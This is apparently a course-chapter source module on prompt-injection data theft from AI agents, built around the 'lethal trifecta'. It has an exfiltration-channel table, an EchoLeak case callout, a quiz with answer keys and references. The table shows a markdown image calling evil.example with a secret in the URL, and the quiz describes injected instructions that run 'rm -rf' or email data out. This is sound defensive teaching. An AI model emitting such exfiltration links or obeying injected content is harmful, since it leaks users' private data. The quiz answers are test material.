import { h2, h3, p, ul, ol, steps, kv, callout, detail, table, code, figure, svg, box, arrow, svgText, sim, range, select, toggle, button, out, pill } from '../../lib/components.mjs';

export const meta = { time: 13, attacks: 'the exploitability test' };
export const scripts = ['/assets/js/sims/a03.js'];

const venn = svg(700, 380, `
${svgText(12, 18, 'THE LETHAL TRIFECTA', 'd-ttl', 'start')}
<circle cx="270" cy="150" r="112" fill="color-mix(in srgb, var(--attack-soft) 60%, transparent)" stroke="var(--attack)" stroke-width="1.5"/>
<circle cx="410" cy="150" r="112" fill="color-mix(in srgb, var(--boundary-soft) 60%, transparent)" stroke="var(--boundary)" stroke-width="1.5"/>
<circle cx="340" cy="262" r="112" fill="color-mix(in srgb, var(--trust-soft) 60%, transparent)" stroke="var(--trust)" stroke-width="1.5"/>
${svgText(206, 100, 'private data', 'd-lbl')}
${svgText(206, 116, 'secrets it can read', 'd-sub')}
${svgText(478, 100, 'untrusted content', 'd-lbl')}
${svgText(478, 116, 'text a stranger wrote', 'd-sub')}
${svgText(340, 348, 'external communication', 'd-lbl')}
${svgText(340, 364, 'a way for bytes to leave', 'd-sub')}
<circle cx="340" cy="186" r="30" fill="var(--attack)" opacity="0.16"/>
${svgText(340, 184, 'EXPLOIT', 'd-attack-t')}
${svgText(340, 200, 'ABLE', 'd-attack-t')}
`, { label: 'Venn diagram of private data, untrusted content and external communication' });

export const body = `
${p(`You cannot secure every agent, and you should not try. Most of them are not exploitable in the
way this course is about, and spending your review budget on those is how the exploitable ones ship
unexamined. This chapter is the triage test.`)}

${h2('Three legs', 'three-legs')}

${p(`The framing is Simon Willison's, and it has held up remarkably well against every incident
published since. An agent is exploitable for data theft when it holds all three of:`)}

${kv([
  ['Access to private data', `Something an attacker wants: your files, your mailbox, your database,
    your authenticated sessions, another tenant's records.`],
  ['Exposure to untrusted content', `Any path by which text a stranger authored reaches the model's
    context. A fetched page, an email, an issue comment, a PDF, a filename.`],
  ['An ability to communicate externally', `Any way bytes can move outward. Note the phrasing: not
    "network access". Any way.`],
])}

${figure(venn, `<b>The intersection is the risk.</b> Two legs is an agent with a bug you can fix
later. Three legs is an agent where a single sentence on a web page reaches your secrets. When you
audit a system, find the three legs before you argue about anything else.`)}

${h2('Score your own', 'lab')}

${p(`The lab below holds a set of real configurations. Toggle each leg and watch the verdict change,
then use the custom row to score something you actually run.`)}

${sim({
  name: 'a03trifecta',
  title: 'Trifecta scorer',
  controls: select('a03-cfg', 'Configuration', [
    ['coding', 'Coding agent · public repo · network on'],
    ['inbox', 'Inbox triage agent'],
    ['browse', 'Browsing agent in your logged-in profile'],
    ['wiki', 'Internal wiki Q&A · read-only · no network'],
    ['support', 'Support bot over a public FAQ'],
    ['report', 'Nightly report · fixed SQL · one recipient'],
  ], 'coding'),
  body: `<div style="display:flex;gap:.6rem;flex-wrap:wrap;margin-bottom:.9rem">
    <button class="act sec" id="a03-t0" data-act>private data</button>
    <button class="act sec" id="a03-t1" data-act>untrusted content</button>
    <button class="act sec" id="a03-t2" data-act>external communication</button></div>
    ${out('a03-out')}`,
  note: `Click a leg to cut it and see what the agent can no longer do, and what it can no longer be
    used for. Cutting a leg always costs capability; the exercise is choosing which capability you
    were least attached to.`,
})}

${h2('“No network access” is the answer people get wrong', 'egress')}

${p(`Cutting egress is usually the cheapest and most effective move, which is why it is worth being
pedantic about what egress means. Every one of these is an exfiltration channel, and several of them
involve the agent making no network call whatsoever:`)}

${table(
  ['Channel', 'How it moves the data', 'Who makes the request'],
  [
    ['Rendered markdown image', '<code>![](https://evil.example/?d=SECRET)</code> in the answer', 'The <b>client</b>, automatically'],
    ['A link in the output', 'The user clicks it; the secret is in the query string', 'The user\'s browser'],
    ['File written to a synced folder', 'Dropbox or OneDrive uploads it minutes later', 'An unrelated daemon'],
    ['Message to another agent', 'That agent has the network access this one lacks', 'The peer agent'],
    ['Git commit', 'CI pushes on the next run', 'Your build system'],
    ['DNS lookup', 'A hostname is data; resolvers log every query', 'The resolver chain'],
    ['An error message', '<code>failed to parse sk_live_…</code> lands in a shared log sink', 'Your observability stack'],
  ]
)}

${callout('attack', 'Why this matters more than it sounds', `<p style="margin-bottom:0">EchoLeak
(CVE-2025-32711) was a zero-click exfiltration from Microsoft 365 Copilot. The user did not click
anything, and the agent did not make an outbound request. The injected content caused the assistant to
emit a markdown image whose URL carried the stolen data, and the <em>rendering client</em> fetched it —
because that is what rendering clients do. When you enumerate egress, enumerate the capabilities of
everything downstream of the agent's output, not just the agent's own network stack.</p>`)}

${h2('Which leg to cut', 'which-leg')}

${steps([
  ['Cutting private data (sometimes free)',
   `Give the agent its own identity with its own smaller dataset rather than impersonating the user.
    A research agent rarely needs your whole Drive; it needs three folders. This is the least-privilege
    work of <a href="/chapters/a22/">A22</a>, and it is often more available than teams assume because
    nobody ever asked what the minimum was.`],
  ['Cutting untrusted content (almost never available)',
   `The reason you deployed the agent is that it reads things. You can narrow the set (allow-listed
    domains, first-party corpora), but "first-party" is not "trusted". Your wiki is writable by every
    employee and by anyone who phishes one. <a href="/chapters/a12/">A12</a> is about exactly this
    mistake.`],
  ['Cutting egress (usually the best value)',
   `An outbound policy naming the two or three hosts the task needs converts a total compromise into a
    contained one. The attacker still owns the model's decisions; they cannot get anything out.
    <a href="/chapters/a23/">A23</a> builds it, including the client-side channels above.`],
  ['Cutting nothing but adding a gate (the fallback)',
   `When all three legs must stay, put a human on the irreversible actions and make the approval show
    the data being sent, not just the tool name. <a href="/chapters/a24/">A24</a> explains why the
    detail matters and how the gate fails if you overuse it.`],
])}

${h2('The trifecta is necessary, not sufficient', 'limits')}

${p(`Two honest caveats, because a heuristic you over-trust is worse than no heuristic.`)}

${ul([
  `<b>Two legs can still hurt you.</b> The trifecta describes <em>data theft</em>. An agent with
   untrusted input and destructive tools but no private data has no exfiltration risk and can still
   delete your repository. Sabotage, spam, resource exhaustion and reputational harm all route around
   the framing. Keep the irreversibility list from A01 as a separate axis.`,
  `<b>The legs are transitive.</b> An agent with no network that hands its output to an agent that has
   one has network access, laundered through a hop. Multi-agent systems (<a href="/chapters/a15/">A15</a>)
   assemble trifectas out of components that individually pass the test, which is the single most
   common way teams talk themselves into a false negative.`,
])}

${h2('What you should be able to do now', 'checkpoint')}

${ul([
  `Score any agent as exploitable or not in under five minutes, and say which leg you would cut.`,
  `List six exfiltration channels that do not involve the agent making a network request.`,
  `Explain why "internal corpus" is not the same as "trusted corpus".`,
  `Name the two situations in which the trifecta gives a false negative.`,
])}
`;

export const quiz = [
  {
    q: `An agent reads internal wiki pages and answers questions in a chat window. It has no tools
        other than retrieval and no network egress. Does it hold the trifecta?`,
    options: [
      `No: with no egress, the third leg is missing.`,
      `Yes: its answer is read by a human who acts on it, which is an external communication channel.`,
      `No: the wiki is an internal source, so the content is not untrusted.`,
      `Only if the wiki contains secrets.`,
    ],
    answer: 1,
    explain: `Two traps in one question. The answer text is a channel: an injected instruction can
      make the assistant emit a markdown image the client fetches, a link the reader clicks, or simply
      a confidently wrong security instruction the reader follows. And "internal" is an
      access-control statement, not a trust statement. The wiki is writable by every employee and by
      anyone who compromises one account, which is exactly the assumption A12 attacks.`,
  },
  {
    q: `Which of these is the cheapest leg to cut for a research agent that must read arbitrary web
        pages and summarise them into a report?`,
    options: [
      `Untrusted content: restrict it to an allow-list of ten domains.`,
      `Private data: run it under a service identity with access only to the output folder.`,
      `External communication: it needs the web, so this is impossible.`,
      `None; the agent is inherently unsafe and should not be built.`,
    ],
    answer: 1,
    explain: `The task defines the untrusted-content leg. Restricting to ten domains narrows it but
      those domains are still third-party-writable, and it guts the agent's purpose. Egress is
      partially cuttable (outbound fetches can be proxied through an allow-list even when reading is
      broad) but reading the web <em>is</em> the fetch. The private-data leg is the one nothing in the
      task requires: a research agent that summarises public pages into a designated folder needs no
      access to your mail, your keys, or your Drive. Give it its own identity and the worst case
      becomes "the report is wrong", not "the report was emailed to a stranger".`,
  },
  {
    q: `Why is a rendered markdown image a particularly dangerous exfiltration channel?`,
    options: [
      `Images can carry steganographic payloads.`,
      `The client fetches the URL automatically, so exfiltration is zero-click and the agent itself made no outbound request.`,
      `Markdown renderers execute JavaScript.`,
      `Image URLs are exempt from content security policies.`,
    ],
    answer: 1,
    explain: `The request is made by the rendering client, not by the agent, which defeats two
      controls at once: an egress policy scoped to the agent's process sees nothing, and a
      human-in-the-loop gate on agent actions never fires because there was no action to approve.
      This is the mechanism behind EchoLeak. The mitigations are on the client side — a strict CSP on
      <code>img-src</code>, or refusing to auto-render remote images in agent output at all.`,
  },
  {
    q: `Agent A has private data and reads untrusted content but no network. Agent B has network but no
        private data. A delegates summarisation tasks to B. What is the security posture?`,
    options: [
      `Safe, since neither agent holds all three legs.`,
      `The pair holds all three legs; A's data reaches B, and B can send it out.`,
      `Safe as long as B validates its inputs.`,
      `Unclear without knowing which model each uses.`,
    ],
    answer: 1,
    explain: `The legs compose. A's message to B is A's egress and B's untrusted input, so the
      combined system is exploitable even though each component passes the test in isolation. This is
      the most common false negative in the framing and the reason A15 treats multi-agent topology as
      a first-class attack surface: teams draw the boundary around one agent, verify it, and never
      draw the boundary around the graph. Score the graph.`,
  },
  {
    q: `Which risk does the trifecta framing <em>not</em> capture?`,
    options: [
      `An injected instruction that emails a customer list to an attacker.`,
      `An injected instruction that runs <code>rm -rf</code> on the working tree.`,
      `An injected instruction that reads a private repo and posts a summary publicly.`,
      `An injected instruction that pastes an API key into a rendered link.`,
    ],
    answer: 1,
    explain: `Destruction needs only untrusted input and a destructive tool — no private data, no
      exfiltration. The trifecta is a test for <em>data theft</em>, and it is excellent at that, but
      sabotage, denial of service and reputational harm route around it entirely. Keep the
      irreversibility inventory from A01 as a separate axis, and note that the controls differ: theft
      is bounded by egress policy, destruction is bounded by write scope and snapshots.`,
  },
  {
    q: `A team argues their agent is safe because it "has no network access — it only writes files to
        a shared project folder." What should you check first?`,
    options: [
      `Whether the files are encrypted at rest.`,
      `Whether anything else syncs, indexes, serves or executes that folder.`,
      `Whether the model is fine-tuned on their data.`,
      `Whether file writes are logged.`,
    ],
    answer: 1,
    explain: `A shared folder is egress if anything downstream moves its contents: cloud sync, a
      static site build, a search indexer, a CI job that commits it, or a colleague's machine that
      mounts it. "No network access" is a statement about one process; egress is a property of the
      whole data path. Encryption at rest, model provenance and logging are all reasonable questions,
      but none of them tells you whether the bytes leave, and that is the leg under discussion.`,
  },
];

export const refs = [
  { authors: 'Simon Willison', title: 'The lethal trifecta for AI agents: private data, untrusted content, and external communication',
    venue: 'simonwillison.net, June 2025', url: 'https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/',
    note: 'the framing this chapter is built on' },
  { authors: 'Simon Willison', title: 'Exfiltration attacks (tag archive)',
    venue: 'simonwillison.net', url: 'https://simonwillison.net/tags/exfiltration-attacks/',
    note: 'the running catalogue of channels, most of which do not look like network access' },
  { authors: 'Aim Labs', title: 'EchoLeak: zero-click data exfiltration in Microsoft 365 Copilot (CVE-2025-32711)',
    venue: 'Aim Security, 2025', url: 'https://www.aim.security/lp/aim-labs-echoleak-blogpost',
    note: 'the client-renders-the-image channel, demonstrated end to end' },
  { authors: 'Kai Greshake, Sahar Abdelnabi, Shailesh Mishra, Christoph Endres, Thorsten Holz, Mario Fritz',
    title: 'Not What You\'ve Signed Up For: Compromising Real-World LLM-Integrated Applications with Indirect Prompt Injection',
    venue: 'ACM AISec Workshop at CCS, 2023', url: 'https://arxiv.org/abs/2302.12173' },
  { authors: 'Johann Rehberger', title: 'ChatGPT Operator: Prompt Injection Exploits and Defenses',
    venue: 'Embrace The Red, February 2025',
    url: 'https://embracethered.com/blog/posts/2025/chatgpt-operator-prompt-injection-exploits/' },
  { authors: 'Yifeng He, Ethan Wang, Yuyang Rong, Zifei Cheng, Hao Chen',
    title: 'Security of AI Agents', venue: 'arXiv, 2024', url: 'https://arxiv.org/abs/2406.08689' },
  { authors: 'Keltin Grimes, Julie Lawler, Robert C. Garrett, Emil Mathew, Marco Christiani, Sara Kingsley, Zhiwei Steven Wu, Nathan VanHoudnos',
    title: 'SoK: Bridging Research and Practice in LLM Agent Security',
    venue: 'CMU Software Engineering Institute, 2025', url: 'https://doi.org/10.1184/R1/30610928' },
];
